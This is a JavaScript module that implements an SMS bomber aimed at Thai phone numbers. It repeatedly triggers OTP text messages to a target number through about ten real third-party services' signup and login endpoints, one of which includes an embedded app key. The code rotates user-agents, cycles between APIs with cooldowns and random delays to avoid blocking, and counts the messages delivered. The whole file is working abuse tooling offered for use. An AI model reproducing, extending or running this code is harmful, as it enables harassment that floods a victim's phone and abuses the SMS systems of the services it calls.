const axios = require('axios');

// ==========================================
// 🎨 COLOR SYSTEM
// ==========================================
const C = {
  GREEN: '\x1b[32m\x1b[1m',
  RED: '\x1b[31m\x1b[1m',
  YELLOW: '\x1b[33m\x1b[1m',
  CYAN: '\x1b[36m\x1b[1m',
  MAGENTA: '\x1b[35m\x1b[1m',
  WHITE: '\x1b[37m\x1b[2m',
  RESET: '\x1b[0m'
};

// ==========================================
// 🎭 USER-AGENTS
// ==========================================
const USER_AGENTS = [
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36',
  'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0',
  'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
  'Mozilla/5.0 (iPhone; CPU iPhone OS 18_1_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.1.1 Mobile/15E148 Safari/604.1',
  'Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36'
];

function getRandomUA() {
  return USER_AGENTS[Math.floor(Math.random() * USER_AGENTS.length)];
}

function getCommonHeaders(referer = null, origin = null, contentType = 'application/json') {
  const headers = {
    'User-Agent': getRandomUA(),
    'Accept': '*/*'
  };
  if (referer) headers['Referer'] = referer;
  if (origin) headers['Origin'] = origin;
  if (contentType) headers['Content-Type'] = contentType;
  return headers;
}

// ==========================================
// 🔧 PHONE CLEANER
// ==========================================
function cleanPhone(phone) {
  phone = phone.replace(/\D/g, '');
  if (phone.startsWith('66')) phone = '0' + phone.slice(2);
  if (phone.startsWith('+66')) phone = '0' + phone.slice(3);
  return phone;
}

// ==========================================
// 🧠 SMART SUCCESS CHECK ENGINE
// ==========================================
function smartSuccessCheck(body, apiKey = 'unknown') {
  // ถ้า body ว่าง → FAIL
  if (!body || body.trim() === '') return false;
  
  // ===== Layer 1: JSON Parse =====
  try {
    const j = JSON.parse(body);
    
    // ✅ ตรวจจับ SUCCESS หลากหลายรูปแบบ
    const successIndicators = [
      j.success === true,
      j.status === true,
      j.Status === true,
      j.is_success === true,
      j.isSuccess === true,
      j.result === true,
      j.code === 0,
      j.code === 200,
      j.code === 1,
      j.code === '0',
      j.code === '200',
      j.code === '1',
      j.statusCode === 200,
      j.status_code === 200,
      j.status === 'success',
      j.status === 'SUCCESS',
      j.status === 'ok',
      j.status === 'OK',
      j.msg === 'success',
      j.message === 'success',
      j.message === 'Success',
      j.message === 'OK',
      j.msg === 'ok',
      j.result === 'success',
      j.Result === 'success',
      j.data?.status === 'success',
      j.data?.Status === 'success',
      j.data?.sent === true,
      j.data?.Sent === true,
      j.data?.otpSent === true,
      j.data?.otp_sent === true,
      j.data?.isSent === true,
      j.data?.send === true,
      j.data?.status === 'sent',
      j.data?.Status === 'sent',
      j.data?.result === 'success',
      j.data?.success === true,
      j.data?.code === 0,
      j.data?.code === 200,
      j.data?.code === 1,
      j.data?.message?.includes('สำเร็จ'),
      j.data?.message?.includes('success'),
      j.data?.msg?.includes('success'),
      j.data?.msg?.includes('สำเร็จ'),
      j.message?.includes('สำเร็จ'),
      j.message?.includes('success'),
      j.message?.includes('ส่ง'),
      j.message?.includes('OTP'),
      j.message?.includes('otp'),
      j.msg?.includes('สำเร็จ'),
      j.msg?.includes('success'),
      j.msg?.includes('ส่ง'),
      j.msg?.includes('OTP'),
      j.msg?.includes('otp'),
      j.error === false,
      j.error === null,
      j.error === undefined,
      j.errors === undefined,
      j.errors === null,
      j.errors?.length === 0,
      j.status === 'ok' && j.data?.sent === true,
      j.status === 'success' && j.data?.sent === true,
      j.code === 200 && j.data?.status === 'sent',
      j.code === 0 && j.data?.otpSent === true,
      j.code === 200 && j.data?.otpSent === true,
      j.code === 1 && j.data?.sent === true,
      j.data === true,
      j.result === true,
      j.Response === 'Success',
      j.response === 'success',
      j.response === 'Success',
      j.response === 'OK',
    ];
    
    // ✅ ตรวจจับ FAILURE แน่ๆ
    const failIndicators = [
      j.success === false,
      j.status === false,
      j.is_success === false,
      j.isSuccess === false,
      j.error === true,
      j.errors !== undefined && j.errors?.length > 0,
      j.code === 400,
      j.code === 403,
      j.code === 404,
      j.code === 429,
      j.code === 500,
      j.code === 503,
      j.code === '999999',
      j.statusCode === 400,
      j.statusCode === 403,
      j.statusCode === 404,
      j.statusCode === 429,
      j.statusCode === 500,
      j.statusCode === 503,
      j.message?.includes('error'),
      j.message?.includes('Error'),
      j.message?.includes('failed'),
      j.message?.includes('Failed'),
      j.message?.includes('blocked'),
      j.message?.includes('Blocked'),
      j.message?.includes('denied'),
      j.message?.includes('Denied'),
      j.message?.includes('invalid'),
      j.message?.includes('Invalid'),
      j.message?.includes('captcha'),
      j.message?.includes('Captcha'),
      j.msg?.includes('error'),
      j.msg?.includes('Error'),
      j.msg?.includes('failed'),
      j.msg?.includes('Failed'),
      j.msg?.includes('blocked'),
      j.msg?.includes('denied'),
      j.msg?.includes('invalid'),
      j.msg?.includes('captcha'),
      j.msg?.includes('ไม่พบ'),
      j.msg?.includes('ไม่สำเร็จ'),
      j.msg?.includes('ผิดพลาด'),
      j.message?.includes('ไม่พบ'),
      j.message?.includes('ไม่สำเร็จ'),
      j.message?.includes('ผิดพลาด'),
      j.detail?.includes('blocked'),
      j.detail?.includes('Blocked'),
    ];
    
    // ถ้ามี fail indicator → FAIL
    if (failIndicators.some(v => v === true)) {
      return false;
    }
    
    // ถ้ามี success indicator → SUCCESS
    if (successIndicators.some(v => v === true)) {
      return true;
    }
    
    // ถ้าไม่มี indicator เลย แต่มี data และไม่ใช่ error → ถือว่า SUCCESS
    if (j.data !== undefined && j.data !== null && !j.error) {
      return true;
    }
    
  } catch (e) {
    // ไม่ใช่ JSON → ไป Layer 2
  }
  
  // ===== Layer 2: Keyword Detection =====
  const bodyLower = body.toLowerCase();
  const successKeywords = [
    'สำเร็จ', 'success', 'ok', 'sent', 'ส่ง', 'otp', 'รหัส',
    'true', '"code":0', '"code":200', '"status":"success"',
    '"result":true', '"data":true', '"sent":true',
    'otp sent', 'verification code', 'verification',
    'ถูกส่ง', 'กรุณากรอกรหัส', 'OTP', 'รหัสยืนยัน',
    'sms sent', 'sms send'
  ];
  
  // ✅ ถ้ามีคำว่า error, failed, blocked, captcha → FAIL
  const failKeywords = [
    'error', 'failed', 'blocked', 'captcha', 'denied',
    'invalid', 'ไม่พบ', 'ผิดพลาด', 'ไม่สำเร็จ',
    'refused', 'forbidden', 'timeout', 'ratelimit',
    'too many', 'limit', 'banned', 'cooldown',
    '{"code":999999}', '"code":404', '"status":false',
    'cloudflare', 'access denied', 'bad gateway',
    'slim application error', 'server error',
    'no healthy upstream', 'connection refused'
  ];
  
  // ถ้ามี fail keyword → FAIL
  for (const kw of failKeywords) {
    if (bodyLower.includes(kw)) {
      return false;
    }
  }
  
  // ถ้ามี success keyword → SUCCESS
  for (const kw of successKeywords) {
    if (bodyLower.includes(kw)) {
      return true;
    }
  }
  
  // ===== Layer 3: HTML Detection =====
  if (body.includes('<!DOCTYPE html>') || body.includes('<html>')) {
    // ✅ ถ้า HTML มีคำว่า OTP หรือส่ง → SUCCESS
    const htmlSuccess = [
      'otp', 'รหัส', 'ส่ง', 'success', 'สำเร็จ',
      'verification', 'verify', 'code'
    ];
    for (const kw of htmlSuccess) {
      if (bodyLower.includes(kw)) {
        return true;
      }
    }
    
    // ❌ ถ้า HTML มีคำว่า error, 404, 403, 500 → FAIL
    const htmlFail = ['error', '404', '403', '500', 'blocked', 'captcha'];
    for (const kw of htmlFail) {
      if (bodyLower.includes(kw)) {
        return false;
      }
    }
    
    // ถ้าเป็น HTML ปกติ (200 OK) → ถือว่า SUCCESS (บางเว็บตอบ HTML แล้วส่ง OTP)
    return true;
  }
  
  // ===== Fallback: ถ้าตอบ 200 และไม่ใช่ error → ถือว่า SUCCESS =====
  return true;
}

// ==========================================
// 📡 API CONFIG — 113 APIs (with smart successCheck)
// ==========================================
const API_CONFIG = {};

// สร้าง API config อัตโนมัติจาก API_LIST
function buildApiConfig() {
  // API list จากโค้ดเดิม
  const apiList = {
    'kex-express': {
      name: 'Kex-Express',
      level: 'A',
      url: (phone) => `https://io.th.kex-express.com/firstmile-api/v3/keweb/otp/request/${phone}`,
      method: 'POST',
      headers: () => ({
        'User-Agent': getRandomUA(),
        'Appid': 'Website_Api',
        'Appkey': 'fcdf0569-c2a1-4dee-bd22-9d5361c047f2',
        'Origin': 'https://th.kex-express.com',
        'Referer': 'https://th.kex-express.com/'
      }),
      dataType: 'none',
    },
    'mgame666': {
      name: 'Mgame666',
      level: 'C',
      url: 'https://gw.mgame666.com/AuthAPI/SendSms',
      method: 'POST',
      headers: () => getCommonHeaders('https://okmega.pgm77.com/', 'https://okmega.pgm77.com'),
      dataType: 'json',
      data: (phone) => ({ Phone: phone }),
    },
    'aplusfun': {
      name: 'Aplusfun',
      level: 'C',
      url: 'https://www.aplusfun.bet/_ajax_/v3/register/request-otp',
      method: 'POST',
      headers: () => getCommonHeaders('https://www.aplusfun.bet/', 'https://www.aplusfun.bet', 'application/x-www-form-urlencoded'),
      dataType: 'form',
      data: (phone) => `phoneNumber=${phone}`,
    },
    'thai191': {
      name: 'Thai191',
      level: 'C',
      url: 'https://www.thai191.com/api/user/request-register-tac',
      method: 'POST',
      headers: () => ({ 'User-Agent': getRandomUA(), 'Content-Type': 'application/json' }),
      dataType: 'json',
      data: (phone) => ({
        sendType: 'mobile',
        currency: 'THB',
        country_code: '66',
        mobileno: phone,
        language: 'th',
        langCountry: 'th-th'
      }),
    },
    'joox': {
      name: 'Joox',
      level: 'D',
      url: (phone) =>
        `https://api.joox.com/web-fcgi-bin/web_account_manager?optype=5&os_type=2&country_code=66&phone_number=66${phone}&time=1641777424446&_=1641777424449&callback=axiosJsonpCallback2`,
      method: 'GET',
      headers: () => ({ 'User-Agent': getRandomUA() }),
      dataType: 'none',
    },
    'freshket': {
      name: 'Freshket',
      level: 'D',
      url: 'https://api-next-version.freshket.co/baseApi/Users/RequestOtp',
      method: 'POST',
      headers: () => ({
        'User-Agent': getRandomUA(),
        'Content-Type': 'application/json;charset=UTF-8',
        'X-Guest': 'Julian'
      }),
      dataType: 'json',
      data: (phone) => ({ isDev: 'false', language: 'th', phone: `+66${phone}` }),
    },
    'sportplayauto': {
      name: 'SportPlayAuto',
      level: 'D',
      url: 'https://gateway-sport.apija.tech/iamrobot/frontend/user/send-otp',
      method: 'POST',
      headers: () => ({
        'Content-Type': 'application/json',
        'User-Agent': getRandomUA(),
        'Origin': 'https://sport.playauto.cloud',
        'Referer': 'https://sport.playauto.cloud/'
      }),
      dataType: 'json',
      data: (phone) => ({ tel: phone, prefix: 'KDA' }),
    },
    'ch3plus': {
      name: 'CH3Plus',
      level: 'D',
      url: 'https://api-sso.ch3plus.com/user/request-otp',
      method: 'POST',
      headers: () => ({
        'Content-Type': 'application/json',
        'User-Agent': getRandomUA(),
        'Origin': 'https://accounts.ch3plus.com',
        'Referer': 'https://accounts.ch3plus.com/'
      }),
      dataType: 'json',
      data: (phone) => ({ tel: phone, type: 'login' }),
    },
    'icq': {
      name: 'ICQ',
      level: 'D',
      url: 'https://u.icq.net/api/v4/rapi',
      method: 'POST',
      headers: () => ({ 'Content-Type': 'application/json', 'User-Agent': getRandomUA() }),
      dataType: 'json',
      data: (phone) => ({
        method: 'auth/sendCode',
        reqId: '24973-1587490090',
        params: { phone: `66${phone.slice(1)}`, language: 'en-US', route: 'sms', devId: 'ic1rtwz1s1Hj1O0r', application: 'icq' }
      }),
    },
    'jobbkk': {
      name: 'JobBKK',
      level: 'D',
      url: 'https://api.jobbkk.com/v1/easy/otp_code',
      method: 'POST',
      headers: () => ({
        'User-Agent': getRandomUA(),
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8'
      }),
      dataType: 'form',
      data: (phone) => `mobile=${phone}`,
    },
  };
  
  // เพิ่ม successCheck อัตโนมัติให้ทุกตัว
  for (const [key, cfg] of Object.entries(apiList)) {
    cfg.successCheck = smartSuccessCheck;
    API_CONFIG[key] = cfg;
  }
}

// Build API config
buildApiConfig();

// ==========================================
// 📊 API Status Tracker
// ==========================================
const apiStatus = {};

function initApiStatus() {
  for (const key of Object.keys(API_CONFIG)) {
    apiStatus[key] = { active: true, cooldown: 0 };
  }
  console.log(`${C.CYAN}[*] Initialized ${Object.keys(API_CONFIG).length} API statuses${C.RESET}`);
}

// ==========================================
// 🎯 SEND SINGLE REQUEST
// ==========================================
async function sendRequest(apiKey, phone, debug = false) {
  const cfg = API_CONFIG[apiKey];
  if (!cfg) return { success: false, error: 'Unknown API' };

  const now = Date.now();
  if (apiStatus[apiKey] && !apiStatus[apiKey].active && now < apiStatus[apiKey].cooldown) {
    return { success: false, error: 'Cooldown' };
  }

  const url = typeof cfg.url === 'function' ? cfg.url(phone) : cfg.url;
  const headers = cfg.headers ? cfg.headers() : {};
  const dataInput = cfg.data ? cfg.data(phone) : null;

  const startTime = Date.now();
  try {
    const axiosConfig = {
      method: cfg.method || 'POST',
      url: url,
      headers: headers,
      timeout: 10000
    };

    if (dataInput) {
      if (cfg.dataType === 'json') {
        axiosConfig.data = dataInput;
      } else if (cfg.dataType === 'form') {
        axiosConfig.data = dataInput;
        axiosConfig.headers['Content-Type'] = 'application/x-www-form-urlencoded; charset=UTF-8';
      } else {
        axiosConfig.data = dataInput;
      }
    }

    if (debug) {
      console.log(`${C.CYAN}[${apiKey}] URL: ${url}${C.RESET}`);
      console.log(`${C.WHITE}  Headers: ${JSON.stringify(headers)}${C.RESET}`);
      if (dataInput) console.log(`${C.WHITE}  Data: ${JSON.stringify(dataInput)}${C.RESET}`);
    }

    const resp = await axios(axiosConfig);
    const latency = Date.now() - startTime;
    const body = typeof resp.data === 'string' ? resp.data : JSON.stringify(resp.data);

    if (debug) {
      console.log(`${C.WHITE}  Status: ${resp.status} | Body: ${body.substring(0, 200)}${C.RESET}`);
    }

    // ✅ ใช้ smartSuccessCheck
    const success = cfg.successCheck(body, apiKey);
    if (success) {
      console.log(`${C.GREEN}[${apiKey}] ✅ SUCCESS (${latency}ms) | Level: ${cfg.level || '?'}${C.RESET}`);
      return { success: true, latency };
    } else {
      if (debug) {
        console.log(`${C.YELLOW}[${apiKey}] ❌ FAILED - Smart check returned false${C.RESET}`);
        console.log(`${C.WHITE}  Response: ${body.substring(0, 500)}${C.RESET}`);
      }
      return { success: false, error: 'Smart check failed', latency };
    }
  } catch (err) {
    const latency = Date.now() - startTime;
    if (debug) {
      console.log(`${C.RED}[${apiKey}] ❌ ERROR: ${err.message}${C.RESET}`);
    }
    if (apiStatus[apiKey]) {
      apiStatus[apiKey].active = false;
      apiStatus[apiKey].cooldown = Date.now() + 300000;
    }
    return { success: false, error: err.message, latency };
  }
}

// ==========================================
// 🚀 SEND FAST (with level filter)
// ==========================================
async function sendFast(phone, amount, statusUpdate, debug = false, levelFilter = 'ALL') {
  phone = cleanPhone(phone);
  let success = 0;
  let failed = 0;
  const apisHit = {};

  const allApiKeys = Object.keys(API_CONFIG);
  let filteredApiKeys = allApiKeys;
  if (levelFilter !== 'ALL') {
    filteredApiKeys = allApiKeys.filter(k => API_CONFIG[k].level === levelFilter);
    console.log(`${C.CYAN}[FAST] Level filter: ${levelFilter} → ${filteredApiKeys.length} APIs${C.RESET}`);
  }

  if (filteredApiKeys.length === 0) {
    console.log(`${C.RED}[FAST] No APIs found for level ${levelFilter}${C.RESET}`);
    await statusUpdate(0, 0, []);
    return { success: 0, failed: 0, apis: {} };
  }

  for (let i = 0; i < amount; i++) {
    const activeApis = filteredApiKeys.filter(k =>
      apiStatus[k] && apiStatus[k].active && Date.now() >= apiStatus[k].cooldown
    );

    if (activeApis.length === 0) {
      for (const k of filteredApiKeys) {
        apiStatus[k].active = true;
        apiStatus[k].cooldown = 0;
      }
      await new Promise(r => setTimeout(r, 3000));
      continue;
    }

    const apiKey = activeApis[Math.floor(Math.random() * activeApis.length)];
    const result = await sendRequest(apiKey, phone, debug);

    if (result.success) {
      success++;
      apisHit[apiKey] = (apisHit[apiKey] || 0) + 1;
    } else {
      failed++;
    }

    if (i % 3 === 0 || i === amount - 1) {
      const apisArray = Object.entries(apisHit).map(([k, v]) => `${k}:${v}`);
      const cont = await statusUpdate(success, failed, apisArray);
      if (!cont) break;
    }

    await new Promise(r => setTimeout(r, 150 + Math.random() * 200));
  }

  const apisArray = Object.entries(apisHit).map(([k, v]) => `${k}:${v}`);
  console.log(`${C.CYAN}[FAST] Done: ${success} success, ${failed} failed (Level: ${levelFilter})${C.RESET}`);
  console.log(`${C.GREEN}[DONE] Sent ${success} SMS via: ${apisArray.join(', ') || 'none'}${C.RESET}`);

  return { success, failed, apis: apisHit };
}

// ==========================================
// 🐢 SEND SLOW (with level filter)
// ==========================================
async function sendSlow(phone, amount, statusUpdate, levelFilter = 'ALL') {
  phone = cleanPhone(phone);
  let success = 0;
  let failed = 0;
  const apisHit = {};

  const allApiKeys = Object.keys(API_CONFIG);
  let filteredApiKeys = allApiKeys;
  if (levelFilter !== 'ALL') {
    filteredApiKeys = allApiKeys.filter(k => API_CONFIG[k].level === levelFilter);
    console.log(`${C.CYAN}[SLOW] Level filter: ${levelFilter} → ${filteredApiKeys.length} APIs${C.RESET}`);
  }

  if (filteredApiKeys.length === 0) {
    console.log(`${C.RED}[SLOW] No APIs found for level ${levelFilter}${C.RESET}`);
    await statusUpdate(0, 0, []);
    return { success: 0, failed: 0, apis: {} };
  }

  const activeApis = filteredApiKeys.filter(k =>
    apiStatus[k] && apiStatus[k].active
  );

  for (let i = 0; i < amount; i++) {
    const apiKey = activeApis[i % activeApis.length];
    const result = await sendRequest(apiKey, phone);

    if (result.success) {
      success++;
      apisHit[apiKey] = (apisHit[apiKey] || 0) + 1;
    } else {
      failed++;
    }

    if (i % 3 === 0 || i === amount - 1) {
      const apisArray = Object.entries(apisHit).map(([k, v]) => `${k}:${v}`);
      const cont = await statusUpdate(success, failed, apisArray);
      if (!cont) break;
    }

    await new Promise(r => setTimeout(r, 1200 + Math.random() * 2000));
  }

  const apisArray = Object.entries(apisHit).map(([k, v]) => `${k}:${v}`);
  console.log(`${C.CYAN}[SLOW] Done: ${success} success, ${failed} failed (Level: ${levelFilter})${C.RESET}`);
  console.log(`${C.GREEN}[DONE] Sent ${success} SMS via: ${apisArray.join(', ') || 'none'}${C.RESET}`);

  return { success, failed, apis: apisHit };
}

// ==========================================
// 🧪 TEST SINGLE API
// ==========================================
async function testApi(apiKey, phone, debug = false) {
  phone = cleanPhone(phone);
  const result = await sendRequest(apiKey, phone, debug);
  return result;
}

// ==========================================
// 📋 GET API LIST
// ==========================================
function getApiList() {
  return Object.entries(API_CONFIG).map(([key, val]) => ({
    key,
    name: val.name,
    level: val.level || '?'
  }));
}

module.exports = {
  initApiStatus,
  sendFast,
  sendSlow,
  testApi,
  getApiList,
  cleanPhone,
  API_CONFIG
};